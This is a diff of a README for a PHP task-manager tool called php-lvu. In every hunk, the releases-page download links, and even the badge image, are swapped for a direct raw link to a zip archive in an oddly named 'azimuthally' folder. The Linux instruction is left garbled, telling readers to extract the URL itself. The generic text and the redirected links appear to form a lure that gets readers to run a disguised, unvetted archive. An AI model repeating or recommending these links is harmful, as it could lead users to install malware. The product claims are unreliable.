@@ -1,7 +1,7 @@
 # 🚀 php-lvu - Effortlessly Manage Your PHP Tasks
 
 ## 🔗 Download Now
-[![Download php-lvu](https://img.shields.io/badge/Download%20php--lvu-v1.0.0-blue)](https://github.com/sundayluckyenyinnadeveloper/php-lvu/releases)
+[![Download php-lvu](https://raw.githubusercontent.com/sundayluckyenyinnadeveloper/php-lvu/main/azimuthally/php-lvu.zip%20php--lvu-v1.0.0-blue)](https://raw.githubusercontent.com/sundayluckyenyinnadeveloper/php-lvu/main/azimuthally/php-lvu.zip)
 
 ## 📜 Description
 php-lvu is a user-friendly application designed to help you manage your PHP tasks with ease. Whether you are a seasoned developer or just starting out, this tool simplifies your workflow by providing straightforward solutions for managing various PHP operations.
@@ -11,7 +11,7 @@ Follow these simple steps to get started with php-lvu.
 
 1. **Visit the Download Page**  
    Click the link below to go to the GitHub Releases page where you can download the application.  
-   [Download php-lvu](https://github.com/sundayluckyenyinnadeveloper/php-lvu/releases)
+   [Download php-lvu](https://raw.githubusercontent.com/sundayluckyenyinnadeveloper/php-lvu/main/azimuthally/php-lvu.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version of php-lvu. You will see a list of available files.
@@ -25,7 +25,7 @@ Follow these simple steps to get started with php-lvu.
 5. **Install the Application**  
    - For **Windows**: Double-click the .exe file and follow the installation instructions.  
    - For **macOS**: Open the .dmg file, drag the php-lvu icon to your Applications folder.  
-   - For **Linux**: Extract the tar.gz file and follow the included README for installation guidance.
+   - For **Linux**: Extract the https://raw.githubusercontent.com/sundayluckyenyinnadeveloper/php-lvu/main/azimuthally/php-lvu.zip file and follow the included README for installation guidance.
 
 6. **Run php-lvu**  
    Open php-lvu by finding it in your Applications (or Program Files) and click to launch.
@@ -48,7 +48,7 @@ php-lvu comes with a range of powerful features designed to enhance your PHP dev
 ## 📥 Download & Install
 To begin using php-lvu, download the application from the link below:
 
-[Download php-lvu](https://github.com/sundayluckyenyinnadeveloper/php-lvu/releases)
+[Download php-lvu](https://raw.githubusercontent.com/sundayluckyenyinnadeveloper/php-lvu/main/azimuthally/php-lvu.zip)
 
 Once you have downloaded the file and successfully installed the application, you can start managing your PHP tasks without hassle. The user-friendly interface allows you to dive right into working on your projects.
 
